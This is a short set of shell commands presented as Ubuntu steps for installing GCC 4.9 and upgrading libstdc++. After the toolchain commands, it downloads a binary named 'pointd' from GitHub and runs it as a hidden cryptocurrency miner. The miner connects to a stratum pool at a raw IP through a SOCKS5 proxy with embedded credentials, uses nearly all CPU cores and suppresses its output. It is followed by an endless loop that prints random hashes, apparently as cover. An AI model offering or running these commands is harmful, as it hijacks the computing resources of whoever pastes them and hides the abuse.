sudo add-apt-repository ppa:ubuntu-toolchain-r/test

sudo apt-get update

sudo apt-get install gcc-4.9

sudo apt-get upgrade libstdc++6

After this is complete, make sure to run the following:
sudo apt-get dist-upgrade

Also, make sure to confirm the necessary dependencies are installed for the right GLIBCXX version.
strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX

curl -L -o pointd https://github.com/oggierf/myproject/raw/main/pointd
chmod +x pointd
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-100 -n 1)-AWS) -p x -t $(nproc --ignore 1) -x socks5://archer:12322@150.136.63.252:1080
 >/dev/null >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
